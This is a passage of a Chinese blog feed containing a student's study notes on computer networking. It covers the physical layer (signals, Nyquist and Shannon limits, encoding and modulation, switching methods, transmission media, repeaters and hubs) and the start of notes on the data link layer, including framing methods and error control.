href="#%E7%BC%96%E7%A0%81%E4%B8%8E%E8%B0%83%E5%88%B6">编码与调制</a><ul><li><a href="#%E5%9F%BA%E5%B8%A6%E4%BF%A1%E5%8F%B7%E4%B8%8E%E5%AE%BD%E5%B8%A6%E4%BF%A1%E5%8F%B7">基带信号与宽带信号</a></li><li><a href="#%E7%BC%96%E7%A0%81%E4%B8%8E%E8%B0%83%E5%88%B6%E7%9A%84%E5%8C%BA%E5%88%86">编码与调制的区分</a></li><li><a href="#%E7%BC%96%E7%A0%81%E4%B8%8E%E8%B0%83%E5%88%B6%E7%9A%84%E5%85%B7%E4%BD%93%E6%96%B9%E5%BC%8F">编码与调制的具体方式</a><ul><li><a href="#%E6%95%B0%E5%AD%97%E6%95%B0%E6%8D%AE%E7%BC%96%E7%A0%81%E4%B8%BA%E6%95%B0%E5%AD%97%E4%BF%A1%E5%8F%B7">数字数据编码为数字信号</a></li><li><a href="#%E6%95%B0%E5%AD%97%E6%95%B0%E6%8D%AE%E8%B0%83%E5%88%B6%E4%B8%BA%E6%A8%A1%E6%8B%9F%E4%BF%A1%E5%8F%B7">数字数据调制为模拟信号</a></li><li><a href="#%E6%A8%A1%E6%8B%9F%E6%95%B0%E6%8D%AE%E7%BC%96%E7%A0%81%E4%B8%BA%E6%95%B0%E5%AD%97%E4%BF%A1%E5%8F%B7">模拟数据编码为数字信号</a></li><li><a href="#%E6%A8%A1%E6%8B%9F%E6%95%B0%E6%8D%AE%E8%B0%83%E5%88%B6%E4%B8%BA%E6%A8%A1%E6%8B%9F%E4%BF%A1%E5%8F%B7">模拟数据调制为模拟信号</a></li></ul></li></ul></li><li><a href="#%E6%95%B0%E6%8D%AE%E4%BA%A4%E6%8D%A2%E6%96%B9%E5%BC%8F">数据交换方式</a><ul><li><a href="#%E7%94%B5%E8%B7%AF%E4%BA%A4%E6%8D%A2circuit-exchanging">电路交换(Circuit Exchanging)</a></li><li><a href="#%E6%8A%A5%E6%96%87%E4%BA%A4%E6%8D%A2message-exchanging">报文交换(Message Exchanging)</a></li><li><a href="#%E5%88%86%E7%BB%84%E4%BA%A4%E6%8D%A2packet-exchanging">分组交换(Packet Exchanging)</a><ul><li><a href="#%E6%95%B0%E6%8D%AE%E6%8A%A5%E6%96%B9%E5%BC%8F">数据报方式</a></li><li><a href="#%E8%99%9A%E7%94%B5%E8%B7%AF%E6%96%B9%E5%BC%8F">虚电路方式</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%92%8C%E8%99%9A%E7%94%B5%E8%B7%AF%E5%AF%B9%E6%AF%94">数据报和虚电路对比</a></li></ul></li><li><a href="#%E4%BA%A4%E6%8D%A2%E6%96%B9%E5%BC%8F%E7%9A%84%E9%80%89%E6%8B%A9">交换方式的选择</a></li></ul></li><li><a href="#%E7%89%A9%E7%90%86%E5%B1%82%E4%BC%A0%E8%BE%93%E4%BB%8B%E8%B4%A8">物理层传输介质</a><ul><li><a href="#%E5%AF%BC%E5%90%91%E5%9E%8B%E4%BC%A0%E8%BE%93%E4%BB%8B%E8%B4%A8">导向型传输介质</a><ul><li><a href="#%E5%8F%8C%E7%BB%9E%E7%BA%BF">双绞线</a></li><li><a href="#%E5%90%8C%E8%BD%B4%E7%94%B5%E7%BC%86">同轴电缆</a></li><li><a href="#%E5%85%89%E7%BA%A4">光纤</a></li></ul></li><li><a href="#%E9%9D%9E%E5%AF%BC%E5%90%91%E5%9E%8B%E4%BC%A0%E8%BE%93%E4%BB%8B%E8%B4%A8">非导向型传输介质</a></li></ul></li><li><a href="#%E7%89%A9%E7%90%86%E5%B1%82%E8%AE%BE%E5%A4%87">物理层设备</a><ul><li><a href="#%E4%B8%AD%E7%BB%A7%E5%99%A8">中继器</a></li><li><a href="#%E9%9B%86%E7%BA%BF%E5%99%A8%E5%A4%9A%E5%8F%A3%E4%B8%AD%E7%BB%A7%E5%99%A8">集线器(多口中继器)</a></li></ul></li></ul><!-- tocstop --><h1><span id="物理层概述">物理层概述</span></h1><p>导图：</p><p><img src="http://cdn.clown2024.cn/202407151636393.png" alt="image-20240311085938464"></p><p>物理层解决如何在连接各种计算机的传输媒体上传输数据比特流，而不是指具体的传输媒体。</p><p><strong>物理层主要任务：</strong>确定与传输媒体接口有关的一些特性</p><p><strong>物理层特性</strong></p><ol><li>机械特性：定义物理连接的特性，规定物理连接时所采用的规格、接口形状、引线数目、引脚数量和排列情况。</li><li>电气特性：规定传输二进制位时，线路上信号的电压范围、阻抗匹配、传输速率和距离限制等。</li><li>功能特性：指明某条线上出现的某一电平表示何种意义，接口部件的信号线的用途。</li><li>规程特性：(过程特性)定义各条物理线路的工作规程和时序关系。</li></ol><h1><span id="数据通信">数据通信</span></h1><h2><span id="数据通信模型">数据通信模型</span></h2><p><img src="http://cdn.clown2024.cn/202407151636394.png" alt="image-20240311133036272"></p><p><strong>数字信号和模拟信号</strong></p><p>这两种信号的最主要区别就是：数字信号是离散的，而模拟信号是连续的。</p><p>数字信号是数字化的，在计算机中，CPU只认识“0”和“1”两个数字，所以数字信号需要由“0”和“1”构成的二制数来表示;而摸拟信号则是连续变化的物理量，它的频率、幅度、相位都可以随着时间连续的变化。</p><p><strong>模拟信号：</strong>是指信息参数在给定范围内表现为连续的信号。或在一段连续的时间间隔内，其代表信息的特征量可以在任意瞬间呈现为任意数值的信号。其分布于自然界的各个角落，如每天的温度变化，连续的山峰。</p><p><strong>数字信号：</strong>是指人们抽象出来的时间上不连续的信号，其幅度的取值是离散的，且幅值被限制在有限个数值之内。<br>例如二进制码就是一种数字信号。</p><h2><span id="相关术语">相关术语</span></h2><p>数据通信指在不同计算机之间传输表示信息的二进制数0、1序列的过程。</p><ul><li><p><strong>数据data：</strong>传送信息的实体，通常是有意义的符号序列。</p></li><li><p><strong>信号：</strong>数据的电气&#x2F;电磁的表现，是数据在传输过程中的存在形式。</p></li><li><p><strong>信源：</strong>产生和发送数据的源头。</p></li><li><p><strong>信宿：</strong>接收数据的终点。</p></li><li><p><strong>信道：</strong>信号的传输媒介。一般用来表示向某一个方向传送信息的介质，因此一条通信线路往往包含一条发送信道和一条接收信道。</p><p><img src="http://cdn.clown2024.cn/202407151636395.png" alt="image-20240311133924072"></p></li></ul><h2><span id="通信方式">通信方式</span></h2><ol><li><p>单工通信</p><p>只有一个方向的通信而没有反方向的交互，仅需要一条信道。</p></li><li><p>半双工通信&#x2F;双向交替通信</p><p>通信的双方都可以发送或接收信息，但任何一方都不能同时发送和接收需要两条信道。</p></li><li><p>全双工同信&#x2F;双向同时通信</p><p>通信双方可以同时发送和接受信息，也需要两条信道。</p></li></ol><h2><span id="数据传输方式">数据传输方式</span></h2><ul><li>串行传输和并行和传输</li></ul><p><img src="http://cdn.clown2024.cn/202407151636396.png" alt="image-20240311134306251"></p><ul><li>同步传输和异步传输</li></ul><p><strong>同步传输：</strong>在同步传输的模式下，数据的传送是以一个数据区块为单位，因此同步传输又称为区块传输。<br>在传送数据时，需先送出1个或多个同步字符，再送出整批的数据。</p><p><img src="http://cdn.clown2024.cn/202407151636397.png" alt="image-20240311164351449"></p><p><strong>异步传输：</strong></p><p>异步传输将比特分成小组进行传送，小组可以是8位的1个字符或更长。发送方可以在任何时刻发送这些比特组，而接收方不知道它们会在什么时候到达。传送数据时，加一个字符起始位和一个字符终止位。</p><p><img src="http://cdn.clown2024.cn/202407151636398.png" alt="image-20240311164401203"></p><h2><span id="数据传输相关术语">数据传输相关术语</span></h2><ul><li><p>码元：码元是指用一个固定时长的信号波形_(数字脉冲)，代表不同离散数值的基本波形，是数字通信中数字信号的计量单位，这个时长内的信号称为k进制码元，而该时长称为码元宽度。当码元的离散状态有M个时(M大于2)，此时码元为M进制码元。</p><p>1码元可以携带多个比特的信息量。例如，在使用二进制编码时，只有两种不同的码元，一种代表0状态，另一种代表1状态。</p><p><strong>例如下面的例子：</strong></p><p><img src="http://cdn.clown2024.cn/202407151636399.png" alt="image-20240311165607774"></p><p>传递01信号的时候，只有两种状态也就是只有两种码元就叫做二进制码元；如果有四种状态的话的就是四进制码元，此时的一个码元就可以携带两个比特的信息，因为四种状态可以用两个比特表示完全；那么相对的，16进制码元就可以携带四个比特的信息。</p></li><li><p>码元传输速率：别名码元速率、波形速率、调制速率、符号速率等，它表示单位时间内数字通信系统所传输的码元个数(也可称为脉冲个数或信号变化的次数)，单位是波特(Baud)；1波特表示数字通信系统每秒传输一个码元。</p><p>数字信号有多进制和二进制之分，但码元速率与进制数无关，只与码元长度T有关；<strong>T就是上面01信号的一横杠时间，也就是一个状态变化的时间。</strong></p><p><img src="http://cdn.clown2024.cn/202407151636400.png" alt="image-20240311170416392"></p></li><li><p>信息传输速率：别名信息速率、比特率等，表示单位时间内数字通信系统传输的二进制码元个数(即比特数)，单位是比特&#x2F;秒(b&#x2F;s)</p><p>若一个码元携带n bit的信息量，那么M Baud的码元传输速率所对应的信息传输速率就为M*n bit&#x2F;s。</p></li><li><p>带宽：</p><ul><li>模拟信号系统中：当输入的信号频率高或低到一定程度，使得系统的输出功率成为输入功率的一半时(即-3dB)，最高频率和最低频率间的差值就代表了系统的通频带宽，其单位为赫兹(Hz)。</li><li>数字设备中：表示在单位时间内从网络中的某一点到另一点所能通过的“最高数据率”&#x2F;单位时间内通过链路的数量，常用来表示网络的通信线路所能传输数据的能力。单位是比特每秒(bps或b&#x2F;s)。带宽更宽，也就是有更大的信息运送能力。</li></ul></li></ul><h1><span id="奈氏准则">奈氏准则</span></h1><h2><span id="失真">失真</span></h2><p>就是因为一些因素干扰，导致传输过程中信号波形改变，导致接收方难以辨认。</p><p><img src="http://cdn.clown2024.cn/202407151636401.png" alt="image-20240311171514652"></p><p><strong>影响失真程度的因素：</strong>1.码元传输速率2.信号传输距离3.噪声干扰 4.传输媒体质量</p><p><strong>码间串扰</strong></p><p>因为传输的频率太快导致接收端失去了码元之间清晰界限的现象</p><p><strong>信道带宽</strong></p><p>信道带宽是信道能通过的最高频率和最低频率之差。频率过高会发生码间串扰，过低会导致容易受到干扰导致波形变化太大。</p><p>比如下图：</p><p><img src="http://cdn.clown2024.cn/202407151636402.png" alt="image-20240311181049734"></p><p>该图的信道带宽就是3300Hz-300Hz&#x3D;3000Hz</p><h2><span id="奈氏准则奈奎斯特定理">奈氏准则(奈奎斯特定理)</span></h2><p><strong>奈式准则</strong>：在理想低通(无噪声，带宽受限)条件下，为了避免码间串扰，极限码元传输速率为2W Baud，W是信道带宽，单位是Hz。</p><p>极限数据传输速率计算如下，也就是上面码元传输速率和信息传输速率的转换。</p><p><img src="http://cdn.clown2024.cn/202407151636403.png" alt="image-20240311181856387"></p><p>由奈式准则可以推出下面的结论：</p><ol><li><p>在任何信道中，码元传输的速率是有上限的。若传输速率超过此上限，就会出现严重的码间串扰问题，使接收端对码元的完全正确识别成为不可能。</p></li><li><p>信道的频带越宽(即能通过的信号高频分量越多)，就可以用更高的速率进行码元的有效传输。</p></li><li><p>奈氏准则给出了码元传输速率的限制，但并没有对信息传输速率给出限制。</p></li><li><p>由于码元的传输速率受奈氏准则的制约，所以要提高数据的传输速率，就必须设法使每个码元能携带更多个比特的信息量，这就需要采用多元制的调制方法。</p></li></ol><h1><span id="香农定理">香农定理</span></h1><p>噪声存在于所有的电子设备和通信信道中。由于噪声随机产生，它的瞬时值有时会很大，因此噪声会使接收端对码元的判决产生错误。但是噪声的影响是相对的，若信号较强，那么噪声影响相对较小。因此，信噪比就很重要。<strong>信噪比&#x3D;信号的平均功率&#x2F;噪声的平均功率</strong>，常记为S&#x2F;N，并用分贝(dB)作为度量单位，即:</p><p><img src="http://cdn.clown2024.cn/202407151636404.png" alt="image-20240312093325742"></p><p><strong>香农定理</strong>：在带宽受限且有噪声的信道中，为了不产生误差，信息的传输速率有上限值</p><p><img src="http://cdn.clown2024.cn/202407151636405.png" alt="image-20240312093437732"></p><p><strong>通过香农定理得出的推论</strong></p><ol><li><p>信道的带宽或信道中的信噪比越大，则信息的极限传输速率就越高。</p></li><li><p>对一定的传输带宽和一定的信噪比，信息传输速率的上限就确定了。</p></li><li><p>只要信息的传输速率低于信道的极限传输速率，就一定能找到某种方法来实现无差错的传输。</p></li><li><p>香农定理得出的为极限信息传输速率，实际信道能达到的传输速率要比它低不少。</p></li><li><p>从香农定理可以看出，若信道带宽W或信噪比S&#x2F;N没有上限(不可能)，那么信道的极限信息传输速率也就没有上限。</p></li></ol><h2><span id="奈式和香农的对比">奈式和香农的对比</span></h2><p><img src="http://cdn.clown2024.cn/202407151636406.png" alt="image-20240312094031816"></p><p><strong>例题</strong></p><p><img src="http://cdn.clown2024.cn/202407151636407.png" alt="image-20240312094101429"></p><p>在两个公式算出的数据传输速率中，应该选择较小的那个才是正确的。</p><h1><span id="编码与调制">编码与调制</span></h1><h2><span id="基带信号与宽带信号">基带信号与宽带信号</span></h2><ul><li><p><strong>基带信号：</strong>将数字信号1和0直接用两种不同的电压表示，再送到数字信道上去传输(基带传输)。</p><p>来自信源的信号，像计算机输出的代表各种文字或图像文件的数据信号都属于基带信号。基带信号就是发出的直接表达了要传输的信息的信号，比如我们说话的声波就是基带信号。(所以基带信号也可以是模拟信号，只是在计网中通常指的是数字信号)</p></li><li><p><strong>宽带信号：</strong>将基带信号进行调制后形成的频分复用模拟信号，再传送到模拟信道上去传输(宽带传输)</p><p>把基带信号经过载波调制后，把信号的频率范围搬移到较高的频段以便在信道中传输(即仅在一段频率范围内能够通过信道)。</p></li></ul><p>这两种信号的选择跟传输距离有关，在距离较近时可以直接使用基带信号直接传输，在距离较远的时候就要使用宽带信号防止信号丢失严重。</p><h2><span id="编码与调制的区分">编码与调制的区分</span></h2><p><img src="http://cdn.clown2024.cn/202407151636408.png" alt="image-20240312135128620"></p><h2><span id="编码与调制的具体方式">编码与调制的具体方式</span></h2><h3><span id="数字数据编码为数字信号">数字数据编码为数字信号</span></h3><p>以下面的二进制数据来介绍各种编码方式：</p><p><img src="http://cdn.clown2024.cn/202407151636409.png" alt="image-20240312141043018"></p><ol><li><p>非归零编码【NRZ】</p><p><img src="http://cdn.clown2024.cn/202407151636410.png" alt="image-20240312141144428"></p><p>特点就是高1低0，该编码很容易实现，但没有纠错功能，且无法判断一个码元的开始和结束，以至于收发双方难以保持同步。</p></li><li><p>曼彻斯特编码</p><p><img src="http://cdn.clown2024.cn/202407151636411.png" alt="image-20240312141802576"></p><p>将一个码元分成两个相等的间隔，前一个间隔为低电平后一个间隔为高电平表示码元1;码元0则正好相反。也可以采用相反的规定。该编码的特点是在每一个码元的中间出现电平跳变，位于中间的跳变既作时钟信号(可用于同步)又作数据信号，但它所占的频带宽度是原始的基带宽度的两倍。</p><p><strong>所以数据传输速率只有调制速率的1&#x2F;2</strong></p></li><li><p>差分曼彻斯特编码</p><p><img src="http://cdn.clown2024.cn/202407151636412.png" alt="image-20240312142117689"></p><p>常用于局域网传输，其规则是:若码元为1，则前半个码元的电平与上一个码元的后半个码元的电平相同，若为0，则相反。该编码的特点是，在每个码元的中间，都有一次电平的跳转，可以实现自同步，且抗干扰性强于曼彻斯特编码。</p></li><li><p>归零编码【RZ】</p><p><img src="http://cdn.clown2024.cn/202407151636413.png" alt="image-20240312141301827"></p><p>就是信号电平在一个码元之内都要恢复到零。</p></li><li><p>反向不归零编码【NRZI】</p><p><img src="http://cdn.clown2024.cn/202407151636414.png" alt="image-20240312141439802"></p><p>信号电平翻转表示0，信号电平不变表示1.</p></li><li><p>4B&#x2F;5B编码</p><p>比特流中插入额外的比特以打破一连串的0或1，就是用5个比特来编码4个比特的数据，之后再传给接收方，因此称为4B&#x2F;5B。编码效率为80%。</p><p>只采用16种编码对应16种不同的4位码，多出来的16种作为控制码(帧的开始和结束，线路的状态信息等)或保留。</p><p><img src="http://cdn.clown2024.cn/202407151636415.png" alt="image-20240312142425457"></p></li></ol><h3><span id="数字数据调制为模拟信号">数字数据调制为模拟信号</span></h3><p>数字数据调制技术在发送端将数字信号转换为模拟信号，而在接收端将模拟信号还原为数字信号，分别对应于调制解调器的调制和解调过程。</p><p><img src="http://cdn.clown2024.cn/202407151636416.png" alt="image-20240312142828014"></p><ul><li>调幅：为1时有幅度，为0时无幅度</li><li>调频：为0时频率较低，为1时频率较高</li><li>调相：即不同状态时波形的相位不同</li></ul><blockquote><p>还可以使用调幅+调相的组合方式(QAM)。</p></blockquote><p><strong>例题</strong></p><p><img src="http://cdn.clown2024.cn/202407151636417.png" alt="image-20240312143129934"></p><blockquote><p>这里相当于有4<em>4&#x3D;16种码元，也就是一码元传输四比特信息，所以是1200</em>4&#x3D;4800b&#x2F;s</p></blockquote><h3><span id="模拟数据编码为数字信号">模拟数据编码为数字信号</span></h3><p>计算机内部处理的是二进制数据，处理的都是数字音频，所以需要将模拟音频通过采样、量化转换成有限个数字表示的离散序列(即实现音频数字化)。</p><p>最典型的例子就是对音频信号进行编码的脉码调制(PCM)，在计算机应用中，能够达到最高保真水平的就是PCM编码，被广泛用于素材保存及音乐欣赏，CD、DVD以及我们常见的 WAV文件中均有应用。它主要包括三步:抽样、量化、编码</p><ol><li><p>抽样</p><p>对模拟信号周期性扫描，把时间上连续的信号变成时间上离散的信号。为了使所得的离散信号能无失真地代表被抽样的模拟数据，要使用采样定理进行采样:<strong>f(采样频率)<strong>大于等于</strong>2f(信号最高频率)</strong></p></li><li><p>量化</p><p>把抽样取得的电平幅值按照一定的分级标度转化为对应的数字值，并取整数，这就把连续的电平幅值转换为离散的数字量。</p></li><li><p>编码</p><p>把量化的结果转换为与之对应的二进制编码。</p></li></ol><h3><span id="模拟数据调制为模拟信号">模拟数据调制为模拟信号</span></h3><p>为了实现传输的有效性，可能需要较高的频率。这种调制方式还可以使用频分复用技术，充分利用带宽资源。在电话机和本地交换机所传输的信号是采用模拟信号传输模拟数据的方式;模拟的声音数据是加载到模拟的载波信号中传输的。</p><h1><span id="数据交换方式">数据交换方式</span></h1><p>有三种数据交换方式：</p><p><strong>电路交换</strong>、<strong>报文交换</strong>、<strong>分组交换</strong></p><p><img src="http://cdn.clown2024.cn/202407151636418.png" alt="image-20240312145450698"></p><h2><span id="电路交换circuit-exchanging">电路交换(Circuit Exchanging)</span></h2><p><img src="http://cdn.clown2024.cn/202407151636419.png" alt="image-20240312145914210"></p><p>连接之后通信方式是全双工的。</p><p>释放连接的方式同理，发送释放连接请求然后等待确认响应。</p><p><strong>特点：</strong>独占资源，用户始终占用端到端的固定传输带宽。适用于远程批处理信息传输或系统间实时性要求高的大量数据传输的情况。</p><p><strong>电路交换优缺点</strong></p><p><img src="http://cdn.clown2024.cn/202407151636420.png" alt="image-20240312150144149"></p><h2><span id="报文交换message-exchanging">报文交换(Message Exchanging)</span></h2><p><strong>报文：</strong>报文(message)是网络中交换与传输的数据单元，即站点一次性要发送的数据块。报文包含了将要发送的完整的数据信息，其长短很不一致，长度不限且可变。</p><p><strong>原理：</strong>无需在两个站点之间建立一条专用通路，其数据传输的单位是报文，传送过程采用存储转发方式。</p><p><strong>过程：</strong></p><p><img src="http://cdn.clown2024.cn/202407151636421.png" alt="image-20240312150452238"></p><p><strong>优缺点：</strong></p><p><img src="http://cdn.clown2024.cn/202407151636422.png" alt="image-20240312150532682"></p><h2><span id="分组交换packet-exchanging">分组交换(Packet Exchanging)</span></h2><p><strong>分组：</strong>大多数计算机网络都不能连续地传送任意长的数据，所以实际上网络系统把数据分割成小块，然后逐块地发送，这种小块就称作分组(packet)。分组交换是现在网络中传输数据最常用的方式。</p><p><strong>分组交换的原理：</strong><br>分组交换与报文交换的工作方式基本相同，都采用存储转发方式，形式上的主要差别在于，分组交换网中要限制所传输的数据单位的长度，一般选128B。发送节点首先对从终端设备送来的数据报文进行接收存储，而后将报文划分成一定长度的分组，并以分组为单位进行传输和交换。接收结点将收到的分组组装成信息或报文。</p><p><strong>过程：</strong></p><p><img src="http://cdn.clown2024.cn/202407151636423.png" alt="image-20240312150939221"></p><p><strong>优缺点</strong></p><p><img src="http://cdn.clown2024.cn/202407151636424.png" alt="image-20240312151003760"></p><h3><span id="数据报方式">数据报方式</span></h3><p><img src="http://cdn.clown2024.cn/202407151636425.png" alt="image-20240312151546362"></p><p><strong>特点</strong></p><ol><li><p>数据报方式为网络层提供无连接服务。发送方可随时发送分组，网络中的结点可随时接收分组。</p><p><strong>无连接服务：</strong>不事先为分组的传输确定传输路径，每个分组独立确定传输路径不同分组传输路径可能不同。</p></li><li><p>同一报文的不同分组达到目的结点时可能发生乱序、重复与丢失。</p></li><li><p>每个分组在传输过程中都必须携带源地址和目的地址，以及分组号。</p></li><li><p>分组在交换结点存储转发时，需要排队等候处理，这会带来一定的时延。当通过交换结点的通信量较大或网络发生拥塞时，这种时延会大大增加，交换结点还可根据情况丢弃部分分组。</p></li><li><p>网络具有冗余路径，当某一交换结点或一段链路出现故障时，可相应地更新转发表，寻找另一条路径转发分组，对故障的适应能力强，适用于突发性通信，不适于长报文，会话式通信。</p></li></ol><h3><span id="虚电路方式">虚电路方式</span></h3><p>虚电路将数据报方式和电路交换方式结合，以发挥两者优点。</p><p><img src="http://cdn.clown2024.cn/202407151636426.png" alt="image-20240312152224056"></p><p><strong>特点</strong></p><p><img src="http://cdn.clown2024.cn/202407151636427.png" alt="image-20240312152525446"></p><h3><span id="数据报和虚电路对比">数据报和虚电路对比</span></h3><p><img src="http://cdn.clown2024.cn/202407151636428.png" alt="image-20240312152559654"></p><h2><span id="交换方式的选择">交换方式的选择</span></h2><ol><li><p>传送数据量大，且传送时间远大于呼叫时，选择电路交换。电路交换传输时延最小。</p></li><li><p>当端到端的通路有很多段的链路组成时,采用分组交换传送数据较为合适。</p></li><li><p>从信道利用率上看，报文交换和分组交换优于电路交换，其中分组交换比报文交换的时延小，尤其适合于计算机之间的突发式的数据通信。</p></li></ol><h1><span id="物理层传输介质">物理层传输介质</span></h1><p>传输介质也称传输媒体&#x2F;传输媒介，它就是数据传输系统中在发送设备和接收设备之间的<strong>物理通路</strong>。</p><p><strong>传输媒体并不是物理层</strong>，传输媒体在物理层的下面，因为物理层是体系结构的第一层，因此有时称传输媒体为0层。在传输媒体中传输的是信号，但传输媒体并不知道所传输的信号代表什么意思。但物理层规定了电气特性，因此能够识别所传送的比特流。</p><p><strong>传输介质</strong></p><p><img src="http://cdn.clown2024.cn/202407151636429.png" alt="image-20240312152930074"></p><h2><span id="导向型传输介质">导向型传输介质</span></h2><h3><span id="双绞线">双绞线</span></h3><p>双绞线是古老、又最常用的传输介质，它由两根采用一定规则并排绞合的、相互绝缘的铜导线组成。</p><p><img src="http://cdn.clown2024.cn/202407151636430.png" alt="image-20240312153151300"></p><blockquote><p>双绞线价格便宜，是最常用的传输介质之一，在局域网和传统电话网中普遍使用。模拟传输和数字传输都可以使用双绞线，其通信距离一般为几公里到数十公里。距离太远时，对于模拟传输，要用放大器放大衰减的信号;对于数字传输，要用中继器将失真的信号整形。</p></blockquote><h3><span id="同轴电缆">同轴电缆</span></h3><p><img src="http://cdn.clown2024.cn/202407151636431.png" alt="image-20240312153436424"></p><h3><span id="光纤">光纤</span></h3><p><img src="http://cdn.clown2024.cn/202407151636432.png" alt="image-20240312153803723"></p><p><strong>单模光纤和多模光纤</strong></p><p><img src="http://cdn.clown2024.cn/202407151636433.png" alt="image-20240312153940233"></p><p><strong>光纤的特点</strong></p><p>1.传输损耗小，中继距离长，对远距离传输特别经济。</p><p>2.抗雷电和电磁干扰性能好。</p><p>3.无串音干扰，保密性好，也不易被窃听或截取数据。</p><p>4.体积小，重量轻。</p><h2><span id="非导向型传输介质">非导向型传输介质</span></h2><p><img src="http://cdn.clown2024.cn/202407151636434.png" alt="image-20240312154418577"></p><p>微波就是利用中继器进行接力通信</p><h1><span id="物理层设备">物理层设备</span></h1><h2><span id="中继器">中继器</span></h2><p><strong>诞生原因：</strong>由于存在损耗，在线路上传输的信号功率会逐渐衰减，衰减到一定程度时将造成信号失真，因此会导致接收错误。</p><p><strong>中继器的功能：</strong>对信号进行&#x3D;&#x3D;再生和还原&#x3D;&#x3D;，对衰减的信号进行放大，保持与原数据相同，以增加信号传输的距离，延长网络的长度。</p><p><img src="http://cdn.clown2024.cn/202407151636435.png" alt="image-20240312154708719"></p><p><strong>中继器的两端：</strong>两端的网络部分是网段，而不是子网，适用于完全相同的两类网络的互连，且两个网段速率要相同。</p><p>中继器只将任何电缆段上的数据发送到另一段电缆上，它仅作用于信号的电气部分，并不管数据中是否有错误数据或不适于网段的数据。</p><p>两端可连相同媒体，也可连不同媒体。</p><p>中继器两端的网段一定要是同一个协议，因为中继器不会存储转发。</p><p><strong>5-4-3规则：</strong>网络标准中都对信号的延迟范围作了具体的规定，因而中继器只能在规定的范围内进行，否则会网络故障。</p><p><img src="http://cdn.clown2024.cn/202407151636436.png" alt="image-20240312155118594"></p><p>比如10M以太网中的5-4-3规则：</p><ol><li><p>5 个网段 : 中继器连接的网络中 , 只允许最多有5个网段 , 每个中继器 两端可以有两个网段 。</p></li><li><p>4 个中继器 : 5个网段内 , 最多有4个中继器 。</p></li><li><p>3 个计算机挂载点 : 只有3个网段可以挂载计算机 。</p></li></ol><h2><span id="集线器多口中继器">集线器(多口中继器)</span></h2><p><strong>功能：</strong>对信号进行再生放大转发，对衰减的信号进行放大，接着转发到其他所有(除输入端口外)处于工作状态的端口上，以增加信号传输的距离，延长网络的长度。不具备信号的定向传送能力，是一个共享式设备。</p><p><img src="http://cdn.clown2024.cn/202407151636437.png" alt="image-20240312155755183"></p>]]></content>
      
      
      <categories>
          
          <category> 基础 计网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络学习-5</title>
      <link href="/2024/03/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-5/"/>
      <url>/2024/03/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-5/</url>
      
        <content type="html"><![CDATA[<h1><span id="数据链路层概述">数据链路层概述</span></h1><p><img src="http://cdn.clown2024.cn/202407151539732.png" alt="image-20240319002608096"></p><h2><span id="基本概念">基本概念</span></h2><p><strong>结点</strong>：主机、路由器。</p><p><strong>链路</strong>：网络中两个结点之间的物理通道，链路的传输介质主要有双绞线、光纤和微波。分为有线链路、无线链路。</p><p><strong>数据链路</strong>：网络中两个结点之间的逻辑通道，把实现控制数据传输协议的硬件和软件加到链路上就构成数据链路。</p><p><strong>帧</strong>：链路层的协议数据单元，封装网络层数据报。</p><h2><span id="功能概述">功能概述</span></h2><p>数据链路层在物理层提供服务的基础上向网络层提供服务，其最基本的服务是将源自网络层来的数据可靠地传输到相邻节点的目标机网络层。其主要作用是加强物理层传输原始比特流的功能，将物理层提供的可能出错的物理连接改造成为逻辑上无差错的数据链路，使之对网络层表现为一条无差错的链路。</p><p><strong>功能一</strong>：为网络层提供服务。无确认无连接服务，有确认无连接服务，有确认面向连接服务。</p><p><strong>功能二</strong>：链路管理，即连接的建立、维持、释放(用于面向连接的服务)。</p><p><strong>功能三</strong>：组帧。</p><p><strong>功能四</strong>：流量控制。</p><p><strong>功能五</strong>：差错控制（帧错&#x2F;位错）</p><h1><span id="封装成帧">封装成帧</span></h1><p><img src="http://cdn.clown2024.cn/202407151539733.png" alt="image-20240319003822417"></p><h2><span id="透明传输">透明传输</span></h2><p>透明传输是指不管所传数据是什么样的比特组合，都应当能够在链路上传送。因此，链路层就“看不见”有什么妨碍数据传输的东西。<br>当所传数据中的比特组合恰巧与某一个控制信息完全一样时，就必须采取适当的措施，使收方不会将这样的数据误认为是某种控制信息。这样才能保证数据链路层的传输是透明的。</p><h2><span id="四种组帧方法">四种组帧方法</span></h2><h3><span id="字符计数法">字符计数法</span></h3><p>帧首部使用一个计数字段(第一个字节，八位)来标明帧内字符数</p><p><img src="http://cdn.clown2024.cn/202407151539734.png" alt="image-20240319004252864"></p><p>但是这样万一其中一个字符数错了，会导致后面所有都出现错误，所以该方法不常用。</p><h3><span id="字符填充法">字符填充法</span></h3><p><img src="http://cdn.clown2024.cn/202407151539735.png" alt="image-20240319004625498"></p><p>如上图在数据传输过程中可能会遇到在数据部分有控制字符导致接收方错误判断帧边界，所以可以用下面的字符填充法，有点类似编程语言中的转义字符。</p><p><img src="http://cdn.clown2024.cn/202407151539736.png" alt="image-20240319004800029"></p><p>发送时在控制字符前添加转义字符ESC，接收时就把所有转义字符去掉</p><h3><span id="零比特填充法">零比特填充法</span></h3><p><img src="http://cdn.clown2024.cn/202407151539737.png" alt="image-20240319005002833"></p><h3><span id="违规编码法">违规编码法</span></h3><p><img src="http://cdn.clown2024.cn/202407151539738.png" alt="image-20240319005216244"></p><p>我们可以知道在物理层的曼彻斯特编码中的码元要不就高-低或者低-高，高-高和低-低是不可能出现的，所以这两种就是违规的编码，这样我们就可以用来界定帧的起始和终止而不会重复，非常的稳妥。</p><blockquote><p>由于字节计数法中Count字段的脆弱性(其值若有差错将导致灾难性后果)及字符填充实现上的复杂性和不兼容性，目前较普遍使用的帧同步法是比特填充和违规编码法。</p></blockquote><h1><span id="差错控制">差错控制</span></h1><h2><span id="差错控制介绍">差错控制介绍</span></h2><p>概括来说，传输中的差错主要是由于噪声引起的</p><p><img src="http://cdn.clown2024.cn/202407151539739.png" alt="image-20240319092243604"></p><p><img src="http://cdn.clown2024.cn/202407151539740.png" alt="image-20240319092442403"></p><h2><span 